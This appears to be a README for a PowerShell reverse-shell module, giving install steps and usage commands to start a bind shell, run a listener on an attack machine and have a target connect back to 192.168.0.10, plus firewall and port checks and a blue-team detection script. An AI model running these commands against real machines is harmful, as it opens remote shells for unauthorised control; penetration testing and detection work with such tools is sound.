# ReversePowerShell
Functions that can be used to gain Reverse Shells with PowerShell. Invoke-ReversePowerShell function can be used
to connect to Start-Listener as well as netcat and metasploit modules however it can not connect to Start-Bind.
I will add a tool for that in the future.

#### BLUE TEAM DISCOVERY
Find-ReverseShell.psm1 can be used to search the Windows Event Log for when a Reverse Shell is created that uses a System.Net.Sockets.TcpListener object. This will discover any reverse shell that creates a TcpListener object and not just the below module. This method does not catch PowerCat.ps1 which I am still looking for a good way to discover. This part is still a work in progress.

#### INSTALL THE MODULE
Install this module by placing the cloned folder "ReversePowerShell" inside the following directory location.
 "$env:USERPROFILE\\WindowsPowerShell\\Modules\\ReversePowerShell"
 For PowerShell Core v6 the location of this module will need to be
 "$env:USERPROFILE\\WindowsPowerShell\\ReversePowerShell"

Once there it can be imported into a PowerShell session using the following command.
```powershell
Import-Module ReversePowerShell
```


You can also copy and paste the functions into your PowerShell session so the cmdlets become available to run.

#### START BIND SHELL
The below command can be executed to start a bind shell that connects the defined port to PowerShell.
This command binds PowerShell to port 8088. I do not have a function that can connect to this. Netcat,
ncat, metasploit, and other tools can be used to connect to this bind shell. I will add a tool in the
future.
```powershell
Start-Bind -Port 8088
```

#### START LISTENER
The below command can be executed to start a listener on the Attack machine on port 8089. This can be
connected too using Invoke-ReversePowerShell as well as ncat, netcat, metasploit, and other tools.
```powershell
Start-Listener -Port 8089
```

#### ISSUE REVERSE SHELL CONNECTION
The below command is to be issued on the Target Machine to connect to the listener over
port 8089. This will not be able to complete a connection to the Start-Bind cmdlet.
```powershell
Invoke-ReversePowerShell -IpAddress 192.168.0.10 -Port 8089
```
---
#### FIREWALL
If you are not able to gain a connection it is most likely due to the Windows Firewall.
The following commands can be used to view firewall rules. If one of these does not work
the other might.
```powershell
$FirewallRule = New-object -ComObject HNetCfg.FwPolicy2
$FirewallRule.Rules | Select-Object -Property *

# OR
Get-NetFirewallRule | Where-Object { $_.Enabled –eq ‘True’ –and $_.Direction –eq ‘Inbound’ }
Show-NetFirewallRule

# OR
cmd /c netsh advfirewall firewall show rule name=all
```

#### VERIFY LISTENING PORTS
You can verify/view actively listening ports on the target computer by issuing the following command.
```powershell
Get-NetTcpConnection -State Listen
```
or if you are a command prompt kind of person;
```powershell
netstat -q
```
